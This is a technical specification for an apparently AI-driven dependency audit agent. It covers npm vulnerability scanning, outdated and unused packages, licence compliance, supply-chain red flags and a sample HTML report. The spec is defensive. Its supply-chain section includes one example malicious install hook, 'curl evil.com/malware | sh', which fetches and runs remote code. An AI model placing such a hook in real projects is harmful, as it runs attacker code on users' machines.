# Dependency Audit Review Agent - Technical Specification

## Overview

A Dependency Audit Review Agent analyzes project dependencies for security vulnerabilities, licensing issues, outdated packages, and supply chain risks. It ensures dependencies are secure, compliant, maintained, and optimally managed.

**Mission**: Maintain a secure and healthy dependency ecosystem while minimizing technical debt and legal risks.

---

## Core Principles

- **Security First**: Known vulnerabilities must be addressed immediately
- **License Compliance**: Avoid legal issues from incompatible licenses
- **Maintenance Health**: Prefer actively maintained packages
- **Minimize Bloat**: Fewer dependencies = smaller attack surface

---

## Detection Strategies by Category

### 1. Security Vulnerabilities (CVEs)

#### Patterns Detected

**Known Vulnerable Versions**
```json
{
  "dependencies": {
    "lodash": "4.17.15",     // CVE-2019-10744, CVE-2020-8203
    "axios": "0.18.0",        // CVE-2020-28168
    "minimist": "1.2.0",      // CVE-2021-44906
    "node-forge": "0.10.0"    // CVE-2022-24771, CVE-2022-24772
  }
}
```

**Direct vs Transitive Vulnerabilities**
```
Direct Dependency Vulnerability:
  your-app → lodash@4.17.15 (CVE-2019-10744)
  ✅ Easy to fix: Update lodash directly

Transitive Dependency Vulnerability:
  your-app → express → body-parser → qs@6.5.2 (CVE-2022-24999)
  ⚠️ Harder to fix: Need to update express or override qs version
```

#### Agent Actions

- `Bash` runs `npm audit --json` or `yarn audit --json`
- Parse vulnerability reports
- Classify by severity: Critical, High, Medium, Low
- Check if patches available
- Identify transitive vulnerability paths
- Cross-reference with NVD (National Vulnerability Database)
- Calculate CVSS scores

#### Severity Classification

```yaml
critical:
  cvss_score: 9.0-10.0
  examples:
    - Remote Code Execution (RCE)
    - SQL Injection in ORM
    - Authentication bypass
  action: Immediate fix required

high:
  cvss_score: 7.0-8.9
  examples:
    - Cross-Site Scripting (XSS)
    - Denial of Service (DoS)
    - Information disclosure
  action: Fix within 7 days

medium:
  cvss_score: 4.0-6.9
  examples:
    - Moderate information disclosure
    - Minor security misconfiguration
  action: Fix within 30 days

low:
  cvss_score: 0.1-3.9
  examples:
    - Low-impact information leakage
  action: Fix in next release cycle
```

---

### 2. Outdated Dependencies

#### Patterns Detected

**Major Versions Behind**
```json
// Current package.json
{
  "dependencies": {
    "react": "16.14.0",      // Latest: 18.2.0 (2 major versions behind)
    "express": "4.17.1",      // Latest: 5.0.0 (1 major version behind)
    "lodash": "4.17.15"       // Latest: 4.17.21 (patch available)
  }
}
```

**Abandoned Packages**
```json
{
  "dependencies": {
    "request": "2.88.2"       // ⚠️ Deprecated, last publish 3 years ago
                              //    Recommended: axios, node-fetch, got
  }
}
```

**Pre-1.0 Packages with Breaking Changes**
```json
{
  "dependencies": {
    "some-lib": "0.8.5"       // ⚠️ Pre-1.0, breaking changes common
                              //    Latest: 0.12.3
  }
}
```

#### Agent Actions

- `Bash` runs `npm outdated --json` or `yarn outdated --json`
- Parse outdated package list
- Check npm registry for latest versions
- Calculate staleness (time since last update)
- Identify deprecated packages
- Check package download trends (declining = potential abandonment)
- Cross-reference with package health scores

#### Staleness Metrics

```yaml
staleness_levels:
  fresh:
    last_update: < 6 months
    status: ✅ Actively maintained

  aging:
    last_update: 6-12 months
    status: ⚠️ Monitor for updates

  stale:
    last_update: 1-2 years
    status: ⚠️ Consider alternatives

  abandoned:
    last_update: > 2 years
    status: ❌ Replace immediately
```

---

### 3. License Compliance

#### Patterns Detected

**Incompatible Licenses**
```json
// Your project: MIT License
{
  "dependencies": {
    "some-lib": "1.0.0"       // GPL-3.0 ⚠️ Viral copyleft incompatible with MIT
  }
}
```

**Missing License Information**
```json
{
  "dependencies": {
    "unknown-lib": "1.0.0"    // ⚠️ No license field in package.json
  }
}
```

**Commercial/Proprietary Restrictions**
```json
{
  "dependencies": {
    "commercial-lib": "1.0.0"  // ⚠️ Requires paid license for commercial use
  }
}
```

#### License Categories

```yaml
permissive: # Generally safe
  - MIT
  - Apache-2.0
  - BSD-2-Clause
  - BSD-3-Clause
  - ISC

weak_copyleft: # Requires attribution, library changes must be open
  - LGPL-2.1
  - LGPL-3.0
  - MPL-2.0

strong_copyleft: # Requires entire project to be open source
  - GPL-2.0
  - GPL-3.0
  - AGPL-3.0

proprietary: # Requires explicit permission/payment
  - Commercial
  - UNLICENSED
  - Custom

public_domain:
  - CC0-1.0
  - Unlicense
```

#### Agent Actions

- Parse `package.json` license fields for all dependencies
- `Bash` runs `license-checker --json` or similar tool
- Classify licenses by type (permissive, copyleft, proprietary)
- Check license compatibility with project license
- Identify packages without license information
- Flag GPL/AGPL in proprietary projects
- Generate license attribution file

---

### 4. Dependency Bloat

#### Patterns Detected

**Unused Dependencies**
```json
// package.json
{
  "dependencies": {
    "lodash": "4.17.21",      // ✅ Used in src/utils.js
    "moment": "2.29.4",       // ❌ Not imported anywhere
    "axios": "1.3.0"          // ❌ Never used (switched to fetch)
  }
}
```

**Duplicate Dependencies**
```
Dependency Tree:
  app
  ├── package-a@1.0.0
  │   └── lodash@4.17.15
  └── package-b@2.0.0
      └── lodash@4.17.21

⚠️ Two versions of lodash installed (bundle bloat)
```

**Heavy Dependencies**
```json
{
  "dependencies": {
    "moment": "2.29.4"         // 289KB (recommend date-fns: 13KB)
  }
}
```

**Entire Libraries for One Function**
```javascript
// ❌ Bad: Import entire lodash (70KB+)
import _ from 'lodash';
_.debounce(fn, 300);

// ✅ Good: Import specific function (2KB)
import debounce from 'lodash/debounce';
```

#### Agent Actions

- `Bash` runs `depcheck --json` to find unused dependencies
- `Bash` runs `npm ls --json` to analyze dependency tree
- Identify duplicate packages at different versions
- Calculate bundle size impact of each dependency
- Check for tree-shakeable alternatives
- Detect full library imports vs specific function imports
- Cross-reference imports with installed packages

---

### 5. Supply Chain Risks

#### Patterns Detected

**Suspicious Package Activity**
```
⚠️ Red Flags:
- Package version published in last 24 hours
- Maintainer recently changed
- Unusual spike in dependencies
- Obfuscated code in package
- Network calls in install scripts
```

**Typosquatting Detection**
```
Installed: "requset" (typo of "request")
⚠️ Potential typosquatting attack
```

**Package Hijacking**
```
Package: popular-lib@5.0.0
⚠️ Warning: Version 5.0.0 published by different maintainer than 4.x
⚠️ Previous: original-author
⚠️ Current: unknown-publisher
```

**Install Scripts**
```json
// package.json
{
  "scripts": {
    "preinstall": "curl evil.com/malware | sh"  // ⚠️ Suspicious install script
  }
}
```

#### Agent Actions

- Check package publish dates (warn on very recent)
- Verify maintainer consistency across versions
- `Grep` package code for suspicious patterns (network calls, eval, exec)
- Detect packages with install scripts
- Cross-reference package names with known typosquatting lists
- Check npm account age and reputation
- Validate package signatures (if available)

---

### 6. Peer Dependency Conflicts

#### Patterns Detected

**Unmet Peer Dependencies**
```
⚠️ npm WARN @example/plugin@1.0.0 requires a peer of react@^17.0.0
   but react@16.14.0 is installed
```

**Conflicting Peer Dependencies**
```
Package A requires: react@^17.0.0
Package B requires: react@^16.8.0
⚠️ Conflict: Cannot satisfy both requirements
```

#### Agent Actions

- Parse npm warnings for peer dependency issues
- Check `peerDependencies` in package.json files
- Validate installed versions match peer requirements
- Suggest resolution strategies (update, override, alternative package)

---

### 7. Development vs Production Dependencies

#### Patterns Detected

**Production Dependency in Dev**
```json
{
  "dependencies": {
    "eslint": "8.0.0"         // ❌ Should be in devDependencies
  }
}
```

**Dev Dependency in Production**
```json
{
  "devDependencies": {
    "axios": "1.3.0"          // ❌ Used in production code!
  }
}
```

#### Agent Actions

- Analyze imports in production code
- Check if dependencies are only used in tests/build scripts
- Suggest moving packages to appropriate section
- Calculate production bundle size impact

---

## Tool Usage Pattern

```
Phase 1: Security Audit (Fast)
├─ Bash: npm audit --json
├─ Parse: Vulnerability report
├─ Classify: By severity
├─ Check: Patch availability
└─ Output: CVE list with remediation

Phase 2: Outdated Check (Fast)
├─ Bash: npm outdated --json
├─ Parse: Version differences
├─ Check: Deprecation status
├─ Calculate: Staleness metrics
└─ Output: Update recommendations

Phase 3: License Audit (Medium)
├─ Bash: license-checker --json
├─ Parse: License types
├─ Classify: Compatibility
├─ Check: Missing licenses
└─ Output: License compliance report

Phase 4: Bloat Analysis (Medium)
├─ Bash: depcheck --json
├─ Bash: npm ls --json
├─ Calculate: Bundle sizes
├─ Detect: Duplicates and unused
└─ Output: Optimization opportunities

Phase 5: Supply Chain Check (Slow, Optional)
├─ Check: Package provenance
├─ Analyze: Maintainer history
├─ Scan: Suspicious code patterns
└─ Output: Supply chain risk assessment
```

---

## Scoring System

### Dependency Health Score (0-100)

```
Score = 100 - (critical_vulns × 25)
            - (high_vulns × 10)
            - (medium_vulns × 3)
            - (license_violations × 15)
            - (abandoned_deps × 5)
            - (unused_deps × 1)

Thresholds:
95-100: Excellent
85-94:  Good
70-84:  Needs Attention
<70:    Critical Issues
```

### Issue Severity

- **Critical (25 pts)**: CVE with CVSS ≥9.0, GPL in proprietary project
- **High (10 pts)**: CVE with CVSS 7.0-8.9, abandoned core dependencies
- **Medium (3 pts)**: CVE with CVSS 4.0-6.9, outdated packages
- **Low (1 pt)**: Unused dependencies, minor bloat

---

## HTML Report Output Structure

```html
<!DOCTYPE html>
<html>
<head>
  <style>/* Uses W3C design tokens */</style>
</head>
<body>
  <section class="executive-summary">
    <h1>Dependency Audit Report</h1>
    <div class="score-badge warning">72/100</div>
    <div class="alert critical">
      ⚠️ CRITICAL: 2 dependencies with known security vulnerabilities
    </div>
    <div class="metrics-grid">
      <div class="metric">
        <h3>Total Dependencies</h3>
        <div class="count">347</div>
        <small>247 direct, 100 transitive</small>
      </div>
      <div class="metric">
        <h3>Vulnerabilities</h3>
        <div class="count">8</div>
        <small>2 critical, 3 high, 3 medium</small>
      </div>
      <div class="metric">
        <h3>Outdated</h3>
        <div class="count">47</div>
        <small>12 major, 23 minor, 12 patch</small>
      </div>
      <div class="metric">
        <h3>Unused</h3>
        <div class="count">5</div>
        <small>Can remove for -2.3MB</small>
      </div>
    </div>
  </section>

  <section class="vulnerabilities">
    <h2>🔴 Security Vulnerabilities</h2>

    <details open>
      <summary>Critical: lodash Prototype Pollution (CVE-2019-10744)</summary>
      <div class="vulnerability-card">
        <div class="vuln-header">
          <span class="badge critical">Critical</span>
          <span class="cvss">CVSS 9.1</span>
        </div>

        <p><strong>Package:</strong> lodash@4.17.15</p>
        <p><strong>Vulnerable:</strong> <4.17.21</p>
        <p><strong>Patched:</strong> ≥4.17.21</p>
        <p><strong>Dependency Path:</strong></p>
        <pre>your-app → lodash@4.17.15</pre>

        <div class="description">
          <h4>Description</h4>
          <p>Prototype pollution vulnerability allowing attackers to modify object prototypes,
             potentially leading to remote code execution in Node.js applications.</p>
        </div>

        <div class="impact">
          <h4>Impact</h4>
          <ul>
            <li>Remote Code Execution (RCE) possible</li>
            <li>Affects all applications using vulnerable lodash version</li>
            <li>Actively exploited in the wild</li>
          </ul>
        </div>

        <div class="remediation">
          <h4>Remediation</h4>
          <pre><code class="language-bash">
npm install lodash@latest  # Upgrades to 4.17.21
# Or
npm audit fix --force
          </code></pre>

          <p><strong>Breaking Changes:</strong> None (patch update)</p>
          <p><strong>Estimated Fix Time:</strong> 5 minutes</p>
        </div>

        <div class="references">
          <h4>References</h4>
          <ul>
            <li><a href="https://nvd.nist.gov/vuln/detail/CVE-2019-10744">NVD CVE-2019-10744</a></li>
            <li><a href="https://github.com/advisories/GHSA-p6mc-m468-83gw">GitHub Advisory</a></li>
          </ul>
        </div>
      </div>
    </details>

    <details>
      <summary>High: axios Server-Side Request Forgery (CVE-2020-28168)</summary>
      <!-- Similar structure -->
    </details>
  </section>

  <section class="outdated">
    <h2>⏰ Outdated Dependencies</h2>

    <table>
      <thead>
        <tr>
          <th>Package</th>
          <th>Current</th>
          <th>Latest</th>
          <th>Status</th>
          <th>Action</th>
        </tr>
      </thead>
      <tbody>
        <tr class="critical">
          <td>react</td>
          <td>16.14.0</td>
          <td>18.2.0</td>
          <td><span class="badge critical">2 major behind</span></td>
          <td>
            <a href="#">Update guide</a>
            <p class="warning">⚠️ Breaking changes</p>
          </td>
        </tr>
        <tr class="warning">
          <td>express</td>
          <td>4.17.1</td>
          <td>4.18.2</td>
          <td><span class="badge warning">5 minor behind</span></td>
          <td>Safe to update</td>
        </tr>
        <tr class="suggestion">
          <td>lodash</td>
          <td>4.17.20</td>
          <td>4.17.21</td>
          <td><span class="badge">1 patch behind</span></td>
          <td>Update for security fix</td>
        </tr>
      </tbody>
    </table>

    <h3>Deprecated Packages</h3>
    <ul>
      <li>
        <strong>request@2.88.2</strong>
        <p>⚠️ Deprecated since 2020. Last publish: 3 years ago</p>
        <p><strong>Recommendation:</strong> Migrate to axios, node-fetch, or got</p>
        <p><a href="#">Migration guide</a></p>
      </li>
    </ul>
  </section>

  <section class="licenses">
    <h2>⚖️ License Compliance</h2>

    <div class="license-summary">
      <p>✅ No incompatible licenses found</p>
      <p>⚠️ 3 packages with unclear licensing</p>
    </div>

    <table>
      <thead>
        <tr>
          <th>License Type</th>
          <th>Count</th>
          <th>Examples</th>
        </tr>
      </thead>
      <tbody>
        <tr class="safe">
          <td>MIT</td>
          <td>289</td>
          <td>react, lodash, axios</td>
        </tr>
        <tr class="safe">
          <td>Apache-2.0</td>
          <td>34</td>
          <td>typescript, rxjs</td>
        </tr>
        <tr class="safe">
          <td>BSD-3-Clause</td>
          <td>12</td>
          <td>d3, protobufjs</td>
        </tr>
        <tr class="warning">
          <td>Unknown</td>
          <td>3</td>
          <td>custom-lib, internal-tool</td>
        </tr>
      </tbody>
    </table>

    <h3>License Warnings</h3>
    <ul>
      <li>
        <strong>custom-lib@1.0.0</strong>
        <p>⚠️ No license information found</p>
        <p><strong>Action:</strong> Contact maintainer or replace package</p>
      </li>
    </ul>
  </section>

  <section class="bloat">
    <h2>📦 Dependency Bloat Analysis</h2>

    <div class="bloat-summary">
      <p>Total Installed Size: <strong>247 MB</strong></p>
      <p>Potential Savings: <strong>-12.3 MB</strong> (5% reduction)</p>
    </div>

    <h3>Unused Dependencies (5)</h3>
    <ul>
      <li><code>moment</code> - Installed but never imported (-289 KB)</li>
      <li><code>colors</code> - Unused in production code (-15 KB)</li>
      <li><code>debug</code> - Unused (-24 KB)</li>
    </ul>

    <h3>Heavy Dependencies</h3>
    <table>
      <thead>
        <tr>
          <th>Package</th>
          <th>Size</th>
          <th>Lighter Alternative</th>
          <th>Savings</th>
        </tr>
      </thead>
      <tbody>
        <tr>
          <td>moment</td>
          <td>289 KB</td>
          <td>date-fns</td>
          <td>-276 KB (95%)</td>
        </tr>
        <tr>
          <td>lodash (full)</td>
          <td>72 KB</td>
          <td>lodash-es (tree-shakeable)</td>
          <td>-58 KB (80%)</td>
        </tr>
      </tbody>
    </table>

    <h3>Duplicate Dependencies</h3>
    <pre><code>
lodash@4.17.15 (from package-a)
lodash@4.17.21 (from package-b)
⚠️ 2 versions installed

Recommendation: Update package-a to use lodash@4.17.21
    </code></pre>
  </section>

  <section class="supply-chain">
    <h2>🔗 Supply Chain Risks</h2>

    <p>✅ No immediate supply chain threats detected</p>

    <h3>Recent Package Updates (Last 7 Days)</h3>
    <ul>
      <li>
        <strong>new-package@1.0.0</strong>
        <p>⚠️ Published 2 days ago (very recent)</p>
        <p><strong>Recommendation:</strong> Monitor for issues before deploying to production</p>
      </li>
    </ul>

    <h3>Packages with Install Scripts</h3>
    <ul>
      <li><code>node-sass</code> - Compiles native bindings (legitimate)</li>
      <li><code>puppeteer</code> - Downloads Chromium (legitimate)</li>
    </ul>
  </section>

  <section class="recommendations">
    <h2>💡 Priority Recommendations</h2>
    <ol>
      <li><strong>IMMEDIATE:</strong> Update lodash to 4.17.21+ (fixes CVE-2019-10744)</li>
      <li><strong>IMMEDIATE:</strong> Update axios to 1.3.0+ (fixes CVE-2020-28168)</li>
      <li><strong>High Priority:</strong> Remove 5 unused dependencies (-2.3 MB)</li>
      <li><strong>Medium Priority:</strong> Update 47 outdated packages</li>
      <li><strong>Low Priority:</strong> Replace moment with date-fns (-276 KB)</li>
    </ol>
  </section>

  <section class="automation">
    <h2>🤖 Automation Recommendations</h2>
    <ul>
      <li>Enable Dependabot/Renovate for automated update PRs</li>
      <li>Add `npm audit` to CI pipeline (fail on critical/high)</li>
      <li>Schedule monthly dependency review meetings</li>
      <li>Use `package-lock.json` / `yarn.lock` for deterministic installs</li>
    </ul>
  </section>

  <section class="trend">
    <h2>📈 Dependency Health Trend</h2>
    <p><em>Compared to previous audit:</em></p>
    <ul>
      <li>Vulnerabilities: 12 → 8 (-4) ✅</li>
      <li>Outdated Packages: 52 → 47 (-5) ✅</li>
      <li>Unused Dependencies: 8 → 5 (-3) ✅</li>
      <li>Total Size: 259 MB → 247 MB (-12 MB) ✅</li>
    </ul>
  </section>
</body>
</html>
```

---

## Integration with Orchestration System

### Dependency Chain

```
Phase 1: dependency-audit-agent (INDEPENDENT)
         └─ Runs npm audit and dependency analysis

Phase 2: security-agent
         └─ Cross-validates security findings

Phase 3: validation-agent
         └─ Validates dependency updates
```

### Execution Time

**~30s-2m** depending on dependency count and network speed

### Configuration

```yaml
agents:
  dependency-audit-agent:
    priority: 1  # Run early (security-critical)
    dependencies: []
    timeout: 180s
    retry: 2
    fail_on:
      critical_vulns: true
      high_vulns: false
    thresholds:
      max_outdated: 50
      max_unused: 10
    check_supply_chain: true  # Enable advanced checks (slower)
```

---

## Best Practices

### Continuous Dependency Management

- Run audits on every PR (CI integration)
- Enable automated update tools (Dependabot, Renovate)
- Review dependencies quarterly (not just security)
- Pin versions in `package-lock.json` / `yarn.lock`
- Use `^` for minor updates, exact versions for breaking-prone packages

### Security-First

- Update security vulnerabilities immediately
- Subscribe to security advisories (GitHub Security Alerts)
- Test updates in staging before production
- Maintain security.md with disclosure policy

---

## Output Files

```
.context-kit/analysis/
├─ dependency-audit-report.html  # Interactive HTML report
├─ dependency-audit-summary.json # Machine-readable results
├─ vulnerabilities.csv           # CVE list with CVSS scores
├─ licenses.json                 # License compliance report
└─ dependency-graph.dot          # Visual dependency tree
```

---

## Related Agents

- **security-agent**: Complements with code-level security
- **performance-agent**: Bundle size overlaps
- **code-quality-agent**: Import optimization

---

## References

- [npm audit](https://docs.npmjs.com/cli/audit)
- [Snyk Vulnerability Database](https://snyk.io/vuln/)
- [National Vulnerability Database](https://nvd.nist.gov/)
- [SPDX License List](https://spdx.org/licenses/)
- [Dependabot](https://github.com/dependabot)
